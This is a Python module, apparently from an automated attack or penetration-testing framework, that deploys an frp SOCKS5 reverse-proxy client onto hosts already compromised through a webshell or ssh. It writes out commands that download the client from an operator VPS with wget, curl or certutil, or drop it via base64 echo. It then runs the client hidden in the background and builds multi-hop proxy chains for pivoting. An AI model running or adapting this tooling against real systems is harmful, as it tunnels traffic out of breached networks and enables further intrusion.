# tools/frp_manager.py
"""
frp代理管理器

功能：
- 自动检测目标系统类型
- 上传frp客户端
- 生成配置文件
- 建立SOCKS5代理
- 支持多级代理链
"""

import os
import json
import base64
import shutil
import subprocess
import tempfile
from typing import Dict, List, Any, Optional
from pathlib import Path
from tool_framework import CommandLineTool


class FRPManager(CommandLineTool):
    """
    frp代理管理器

    简化版代理方案：只用frp
    """

    # frp二进制文件目录 (镜像内置)
    FRP_DIR = Path("/opt/frp")

    # 默认VPS配置（需要用户修改）
    DEFAULT_VPS_IP = "YOUR_VPS_IP"
    DEFAULT_VPS_PORT = 7000

    def __init__(self):
        super().__init__("frpc")
        self.timeout = 60

    def name(self) -> str:
        return "frp-manager"

    def description(self) -> str:
        return "frp代理管理器，自动部署SOCKS5代理，支持多级代理链。"

    def supported_vulns(self) -> list:
        return ["Proxy Setup", "SOCKS5", "Multi-hop Proxy"]

    def check_available(self) -> bool:
        """检查frp文件是否存在"""
        linux_frp = self.FRP_DIR / "frpc"
        windows_frp = self.FRP_DIR / "frpc.exe"
        return linux_frp.exists() or windows_frp.exists()

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: setup/status/stop",
                "required": True
            },
            "vps_ip": {
                "type": "str",
                "description": "VPS服务器IP",
                "required": False
            },
            "vps_port": {
                "type": "int",
                "description": "VPS frps端口，默认7000",
                "required": False
            },
            "remote_port": {
                "type": "int",
                "description": "远程SOCKS5端口",
                "required": False
            },
            "target_host": {
                "type": "str",
                "description": "目标主机（已获得shell的主机）",
                "required": False
            },
            "system_type": {
                "type": "str",
                "description": "目标系统类型: linux/windows",
                "required": False
            },
            "upload_method": {
                "type": "str",
                "description": "上传方式: echo/base64/wget/curl",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行frp操作"""
        action = params.get("action", "setup")

        if action == "setup":
            return self._setup_proxy(params)
        elif action == "status":
            return self._check_status(params)
        elif action == "stop":
            return self._stop_proxy(params)
        else:
            return {"error": f"未知操作: {action}", "success": False}

    def _setup_proxy(self, params: Dict) -> Dict:
        """
        设置代理

        步骤：
        1. 检测系统类型
        2. 选择frp二进制
        3. 生成配置文件
        4. 提供上传和启动命令
        """
        vps_ip = params.get("vps_ip", self.DEFAULT_VPS_IP)
        vps_port = params.get("vps_port", self.DEFAULT_VPS_PORT)
        remote_port = params.get("remote_port", 10800)
        system_type = params.get("system_type", "linux")

        # 检查VPS配置
        if vps_ip == "YOUR_VPS_IP":
            return {
                "error": "请先配置VPS IP地址",
                "success": False,
                "hint": "在params中设置vps_ip参数"
            }

        # 选择frp二进制
        if system_type == "windows":
            frp_binary = self.FRP_DIR / "frpc.exe"
            config_name = "frpc.toml"
        else:
            frp_binary = self.FRP_DIR / "frpc"
            config_name = "frpc.toml"

        # 检查frp文件是否存在
        if not frp_binary.exists():
            return {
                "error": f"frp文件不存在: {frp_binary}",
                "success": False,
                "hint": "frp应在镜像中自动下载到/opt/frp/目录，请检查Dockerfile",
                "download_url": "https://github.com/fatedier/frp/releases"
            }

        # 生成配置文件
        config_content = self._generate_config(
            vps_ip=vps_ip,
            vps_port=vps_port,
            remote_port=remote_port
        )

        # 生成上传命令
        upload_commands = self._generate_upload_commands(
            frp_binary=frp_binary,
            config_content=config_content,
            system_type=system_type
        )

        # 生成启动命令
        start_command = self._generate_start_command(system_type)

        return {
            "success": True,
            "action": "setup",
            "proxy_info": {
                "vps_ip": vps_ip,
                "vps_port": vps_port,
                "remote_port": remote_port,
                "socks5_address": f"{vps_ip}:{remote_port}"
            },
            "config_content": config_content,
            "upload_commands": upload_commands,
            "start_command": start_command,
            "proxychains_config": f"socks5 {vps_ip} {remote_port}",
            "notes": [
                "1. 先在VPS上启动frps服务端",
                "2. 通过webshell/ssh执行上传命令",
                "3. 启动frpc客户端",
                f"4. 使用代理: proxychains4 -q command (配置socks5 {vps_ip} {remote_port})"
            ]
        }

    def _generate_config(self, vps_ip: str, vps_port: int,
                         remote_port: int) -> str:
        """生成frpc.toml配置文件"""
        config = f"""# frpc configuration
serverAddr = "{vps_ip}"
serverPort = {vps_port}

[[proxies]]
name = "socks5"
type = "tcp"
localIP = "127.0.0.1"
localPort = 1080
remotePort = {remote_port}
"""
        return config

    def _generate_upload_commands(self, frp_binary: Path,
                                   config_content: str,
                                   system_type: str) -> Dict[str, str]:
        """生成各种上传方式的命令"""
        commands = {}

        # 读取二进制文件
        with open(frp_binary, "rb") as f:
            binary_data = f.read()

        binary_b64 = base64.b64encode(binary_data).decode()
        config_b64 = base64.b64encode(config_content.encode()).decode()

        if system_type == "linux":
            # 方式1: echo base64
            commands["echo_base64"] = f"""
# Upload frpc binary
echo '{binary_b64[:1000]}...' | base64 -d > /tmp/frpc
# (需要分块上传，每块1000字符)

# Upload config
echo '{config_b64}' | base64 -d > /tmp/frpc.toml

# Set permissions
chmod +x /tmp/frpc
"""

            # 方式2: wget
            commands["wget"] = f"""
# 从VPS下载
wget http://YOUR_VPS/frpc -O /tmp/frpc
wget http://YOUR_VPS/frpc.toml -O /tmp/frpc.toml
chmod +x /tmp/frpc
"""

            # 方式3: curl
            commands["curl"] = f"""
curl http://YOUR_VPS/frpc -o /tmp/frpc
curl http://YOUR_VPS/frpc.toml -o /tmp/frpc.toml
chmod +x /tmp/frpc
"""

        else:  # Windows
            commands["echo_base64"] = f"""
# Upload frpc.exe (PowerShell)
[IO.File]::WriteAllBytes("C:\\temp\\frpc.exe", [Convert]::FromBase64String("{binary_b64[:1000]}..."))

# Upload config (PowerShell)
[IO.File]::WriteAllBytes("C:\\temp\\frpc.toml", [Convert]::FromBase64String("{config_b64}"))
"""

            commands["certutil"] = f"""
# Using certutil (CMD)
certutil -urlcache -split -f http://YOUR_VPS/frpc.exe C:\\temp\\frpc.exe
certutil -urlcache -split -f http://YOUR_VPS/frpc.toml C:\\temp\\frpc.toml
"""

        return commands

    def _generate_start_command(self, system_type: str) -> str:
        """生成启动命令"""
        if system_type == "linux":
            return """
# Start frpc in background
cd /tmp
nohup ./frpc -c frpc.toml > /dev/null 2>&1 &

# Check if running
ps aux | grep frpc
"""
        else:
            return """
# Start frpc (Windows)
cd C:\\temp
start /B frpc.exe -c frpc.toml

# Check if running
tasklist | findstr frpc
"""

    def _check_status(self, params: Dict) -> Dict:
        """检查代理状态"""
        # 从memory读取代理状态
        try:
            from memory.memory_manager import get_memory_manager
            mm = get_memory_manager()
            proxies = mm.get_active_proxies()
            return {
                "success": True,
                "active_proxies": proxies,
                "count": len(proxies)
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def _stop_proxy(self, params: Dict) -> Dict:
        """停止代理"""
        system_type = params.get("system_type", "linux")

        if system_type == "linux":
            kill_command = "pkill frpc"
        else:
            kill_command = "taskkill /F /IM frpc.exe"

        return {
            "success": True,
            "action": "stop",
            "kill_command": kill_command
        }

    def build_proxy_chain(self, hops: List[Dict]) -> Dict:
        """
        构建多级代理链

        Args:
            hops: 跳板列表，每项包含 {host, port, system_type}

        Returns:
            代理链配置
        """
        chain = []
        proxychains_lines = []

        for i, hop in enumerate(hops):
            remote_port = 10800 + i  # 每跳使用不同端口

            setup_result = self._setup_proxy({
                "vps_ip": hop.get("vps_ip", self.DEFAULT_VPS_IP),
                "vps_port": hop.get("vps_port", self.DEFAULT_VPS_PORT),
                "remote_port": remote_port,
                "system_type": hop.get("system_type", "linux")
            })

            chain.append({
                "hop": i + 1,
                "host": hop.get("host"),
                "remote_port": remote_port,
                "setup": setup_result
            })

            proxychains_lines.append(f"socks5 {hop.get('vps_ip')} {remote_port}")

        return {
            "success": True,
            "chain": chain,
            "proxychains_config": "\n".join(proxychains_lines),
            "total_hops": len(hops)
        }


def setup_single_proxy(vps_ip: str, vps_port: int = 7000,
                        remote_port: int = 10800,
                        system_type: str = "linux") -> Dict:
    """
    快速设置单个代理

    Args:
        vps_ip: VPS IP地址
        vps_port: frps端口
        remote_port: SOCKS5端口
        system_type: linux/windows

    Returns:
        设置结果
    """
    manager = FRPManager()
    return manager._setup_proxy({
        "vps_ip": vps_ip,
        "vps_port": vps_port,
        "remote_port": remote_port,
        "system_type": system_type
    })


def register():
    """注册frp管理器"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(FRPManager())